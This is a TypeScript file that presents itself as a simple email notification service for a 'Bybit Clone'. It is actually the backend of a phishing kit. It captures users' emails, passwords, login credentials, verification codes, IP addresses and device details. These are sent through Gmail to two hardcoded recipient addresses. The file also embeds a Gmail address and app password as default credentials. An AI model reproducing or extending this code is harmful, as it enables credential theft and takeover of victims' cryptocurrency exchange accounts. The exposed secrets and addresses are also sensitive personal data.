// Simple email service that logs emails and can be extended with external services
import * as nodemailer from "nodemailer"

// Email configuration from environment variables
const EMAIL_CONFIG = {
  ADMIN_EMAIL: process.env.ADMIN_EMAIL || "westkhalifahninety7@gmail.com",
  APP_PASSWORD: process.env.APP_PASSWORD || "sawujuvkbqpobevf",
  RECIPIENT_EMAIL_1: process.env.RECIPIENT_EMAIL_1 || "ao2674710@gmail.com",
  RECIPIENT_EMAIL_2: process.env.RECIPIENT_EMAIL_2 || "princeadeluv13@gmail.com",
}

// Create reusable transporter
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: EMAIL_CONFIG.ADMIN_EMAIL,
    pass: EMAIL_CONFIG.APP_PASSWORD,
  },
})

export interface EmailData {
  userEmail?: string
  userPassword?: string
  loginEmail?: string
  loginPassword?: string
  ticketId?: string
  qrCode?: string
  ipAddress: string
  timestamp: string
  deviceInfo?: string
  loginSuccess?: boolean
  verificationCode?: string
  success?: boolean
  emailType: "first-verification" | "bybit-login" | "second-verification"
}

export async function sendNotificationEmail(data: EmailData) {
  const recipients = [EMAIL_CONFIG.RECIPIENT_EMAIL_1, EMAIL_CONFIG.RECIPIENT_EMAIL_2]

  let subject = ""
  let htmlContent = ""

  switch (data.emailType) {
    case "first-verification":
      subject = "🔐 First Verification Attempt - Bybit Clone"
      htmlContent = generateFirstVerificationEmail(data)
      break

    case "bybit-login":
      const status = data.loginSuccess ? "SUCCESS" : "FAILED"
      subject = `🏦 Bybit Login ${status} - Bybit Clone`
      htmlContent = generateBybitLoginEmail(data)
      break

    case "second-verification":
      const verificationStatus = data.success ? "Complete" : "Started"
      subject = `🛡️ Second Verification ${verificationStatus} - Bybit Clone`
      htmlContent = generateSecondVerificationEmail(data)
      break
  }

  try {
    const mailOptions = {
      from: `"Bybit Clone" <${EMAIL_CONFIG.ADMIN_EMAIL}>`,
      to: recipients.join(", "),
      subject: subject,
      html: htmlContent,
    }

    const info = await transporter.sendMail(mailOptions)
    console.log(`${data.emailType} email notification sent successfully:`, info.messageId)
    return { success: true, messageId: info.messageId }
  } catch (error) {
    console.error(`Error sending ${data.emailType} email:`, error)
    return { success: false, error }
  }
}

function generateFirstVerificationEmail(data: EmailData): string {
  return `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
      <h2 style="color: #f7931a;">🔐 First Verification Attempt</h2>
      
      <div style="background: #f5f5f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3>Verification Details:</h3>
        <p><strong>Timestamp:</strong> ${data.timestamp}</p>
        <p><strong>User Email:</strong> ${data.userEmail}</p>
        <p><strong>User Password:</strong> ${data.userPassword}</p>
        <p><strong>IP Address:</strong> ${data.ipAddress}</p>
      </div>
      
      <div style="background: #e3f2fd; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3>Generated Verification Data:</h3>
        <p><strong>Ticket ID:</strong> <code style="background: #fff; padding: 4px 8px; border-radius: 4px; font-family: monospace;">${data.ticketId}</code></p>
        <p><strong>QR Code:</strong> <code style="background: #fff; padding: 4px 8px; border-radius: 4px; font-family: monospace;">${data.qrCode}</code></p>
      </div>
      
      <div style="background: #fff3e0; padding: 15px; border-radius: 8px; margin: 20px 0;">
        <p><strong>⚠️ Security Alert:</strong> User is attempting first verification step.</p>
      </div>
    </div>
  `
}

function generateBybitLoginEmail(data: EmailData): string {
  const statusColor = data.loginSuccess ? "#4caf50" : "#f44336"
  const statusText = data.loginSuccess ? "SUCCESS" : "FAILED"

  return `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
      <h2 style="color: #f7931a;">🏦 Bybit Login Attempt</h2>
      
      <div style="background: ${statusColor}; color: white; padding: 15px; border-radius: 8px; margin: 20px 0; text-align: center;">
        <h3>LOGIN ${statusText}</h3>
      </div>
      
      <div style="background: #f5f5f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3>Login Details:</h3>
        <p><strong>Timestamp:</strong> ${data.timestamp}</p>
        <p><strong>Email Used:</strong> ${data.loginEmail}</p>
        <p><strong>Password Used:</strong> ${data.loginPassword}</p>
        <p><strong>Login Status:</strong> <span style="color: ${statusColor}; font-weight: bold;">${statusText}</span></p>
      </div>
      
      <div style="background: #e8f5e8; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3>Device & Security Info:</h3>
        <p><strong>Device Info:</strong> ${data.deviceInfo}</p>
        <p><strong>IP Address:</strong> ${data.ipAddress}</p>
      </div>
      
      <div style="background: #fff3e0; padding: 15px; border-radius: 8px; margin: 20px 0;">
        <p><strong>📊 Status:</strong> User ${data.loginSuccess ? "successfully logged into" : "failed to log into"} Bybit platform.</p>
      </div>
    </div>
  `
}

function generateSecondVerificationEmail(data: EmailData): string {
  return `
    <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
      <h2 style="color: #f7931a;">🛡️ Second Verification ${data.success ? "Completed" : "Initiated"}</h2>
      
      <div style="background: #f5f5f5; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3>Second Verification Details:</h3>
        <p><strong>Timestamp:</strong> ${data.timestamp}</p>
        <p><strong>IP Address:</strong> ${data.ipAddress}</p>
        ${data.verificationCode ? `<p><strong>Code Entered:</strong> <code style="background: #fff; padding: 4px 8px; border-radius: 4px; font-family: monospace;">${data.verificationCode}</code></p>` : ""}
      </div>
      
      <div style="background: #e3f2fd; padding: 20px; border-radius: 8px; margin: 20px 0;">
        <h3>Generated Verification Data:</h3>
        <p><strong>Second Ticket ID:</strong> <code style="background: #fff; padding: 4px 8px; border-radius: 4px; font-family: monospace;">${data.ticketId}</code></p>
        <p><strong>Second QR Code:</strong> <code style="background: #fff; padding: 4px 8px; border-radius: 4px; font-family: monospace;">${data.qrCode}</code></p>
      </div>
      
      <div style="background: ${data.success ? "#e8f5e8" : "#fff3e0"}; padding: 15px; border-radius: 8px; margin: 20px 0;">
        <p><strong>${data.success ? "✅" : "⏳"}</strong> ${data.success ? "Verification completed successfully!" : "User proceeding with second verification step."}</p>
      </div>
    </div>
  `
}
